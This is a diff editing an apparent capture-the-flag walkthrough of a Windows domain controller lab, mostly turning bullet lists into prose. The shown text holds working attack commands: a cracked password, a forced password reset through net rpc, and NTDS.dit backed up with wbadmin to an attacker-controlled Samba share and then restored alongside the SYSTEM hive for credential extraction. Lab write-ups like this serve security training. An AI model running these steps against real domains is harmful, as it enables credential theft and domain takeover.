@@ -55,7 +55,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Tue Sep  1 00:58:35 2026 -- 1 IP address (1 host up) scanned in 130.40 seconds
 ```
 
-- Anonymous LDAP bind shows nothing
+Anonymous LDAP bind shows nothing.
 
 Listing shares as Guest revealed the `profile$` share is readable — it holds a directory per username. Convert the directory names into a wordlist, and also run `--rid-brute` for valid usernames. Comparing the two lists gave the suspected-legit accounts (we just went with all profile names):
 
@@ -73,13 +73,7 @@ lydericlefebvre
 
 > `support - #00^BlackKnight`
 
-Querying LDAP with those creds:
-
-- no LegacyPwd
-- no servicePrincipleName
-- no known svc accounts
-
-**support** is not a member of Remote Management Users — no shell yet.
+Querying LDAP with those creds turned up no LegacyPwd, no servicePrincipleName, and no known service accounts. **support** is not a member of Remote Management Users — no shell yet.
 
 ## bloodhound-python
 
@@ -95,8 +89,7 @@ pip3 install bloodhound
 bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17 -c ALL
 ```
 
-- Upload the json files to the bloodhound GUI
-- Outbound edge between `support` and `audit2020`: **ForceChangePassword**
+Uploading the JSON files to the BloodHound GUI revealed an outbound edge between `support` and `audit2020`: **ForceChangePassword**.
 
 ```sh
 net rpc password "audit2020" 'password123!' -U "blackfield"/"support"%"#00^BlackKnight" -S "blackfield.htb"
@@ -163,8 +156,7 @@ robocopy /b C:\Users\Administrator\Desktop\ C:\
 
 **wbadmin** is a Windows command-line tool used to **back up** and **restore** Windows operating systems, files, folders, and volumes from the command prompt.
 
-- First install and configure a samba server with authentication
-- Modify the contents of **/etc/samba/smb.conf** to the following:
+First install and configure a samba server with authentication — modify the contents of **/etc/samba/smb.conf** to the following:
 
 ```
 [as
@@ -173,24 +165,22 @@ robocopy /b C:\Users\Administrator\Desktop\ C:\
 ---
 **Note**: Same idea as **impacket-smbserver** but it won't work here.
 
-**Reason** : `smbserver` is for quick POCs (proof-of-concept). Samba is for real file operations like backups.
-- `smbserver` is too basic — it **can't reliably handle** the DC writing large backup files or managing file operations properly
-- You need **Samba** because `wbadmin` is writing critical files and needs a proper, stable SMB server.
+**Reason** : `smbserver` is for quick POCs (proof-of-concept). Samba is for real file operations like backups. `smbserver` is too basic — it **can't reliably handle** the DC writing large backup files or managing file operations properly. You need **Samba** because `wbadmin` is writing critical files and needs a proper, stable SMB server.
 ---
 
-- Create a new user that matches the user in the **force user** parameter:
+Create a new user that matches the user in the **force user** parameter:
 
 ```sh
 adduser smbuser
 ```
 
-- Create password for new user : `smbuser`
+Create a password for the new user: `smbuser`
 
 ```sh
 smbpasswd -a smbuser
 ```
 
-Start the **SMB demon**:
+Start the **SMB daemon**:
 
 ```sh
 service smbd restart
@@ -211,14 +201,13 @@ Back up the **NTDS folder** with `wbadmin`:
 ---
 #### Why use remote in the attack :
 
-Going to remote (attacker's server) is used in attacks because:
+Sending the backup to a remote target (the attacker's server) is standard in attacks because:
 
 - You control the Samba server — you can immediately extract the backup
 - Keeps it off the DC — less evidence left behind
 - Faster exfiltration — backup data goes directly to attacker
 
-Technically, a local backup folder would also work to bypass the lock. 
-The lock bypass comes from **wbadmin's privileges**, not from the backup being remote.
+Technically, a local backup folder would also work to bypass the lock — the bypass comes from **wbadmin's privileges**, not from the backup being remote.
 
 ---
 
@@ -236,19 +225,16 @@ Now restore the **NTDS.dit**, specifying the **backup version**:
 *Evil-WinRM* PS C:\> echo "Y" | wbadmin start recovery -version:09/02/2026-00:58 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-- We got a unlocked version of ntds.dit
+- We got an unlocked version of ntds.dit
 
 ---
 It extracts **NTDS.dit** from the **backup file** and puts it on the C: drive — but here's the key part:
 
-When Windows extracts files from a backup, **it bypasses the file locks**.
-- On a live system, NTDS.dit is locked because Active Directory is constantly using it.
-- But inside a backup file, it's just data — no locks. So Windows can pull it out cleanly.
+When Windows extracts files from a backup, **it bypasses the file locks**. On a live system, NTDS.dit is locked because Active Directory is constantly using it. But inside a backup file, it's just data — no locks, so Windows can pull it out cleanly.
 
 ---
 
-**system.hive** is a separate file. It sits in `C:\Windows\System32\config\SYSTEM` on every Windows machine.
-- We don't extract it from the backup — we just export it directly:
+**system.hive** is a separate file. It sits in `C:\Windows\System32\config\SYSTEM` on every Windows machine, so we don't extract it from the backup — we just export it directly:
 
 ```sh
 reg save HKLM\SYSTEM C:\system.hive
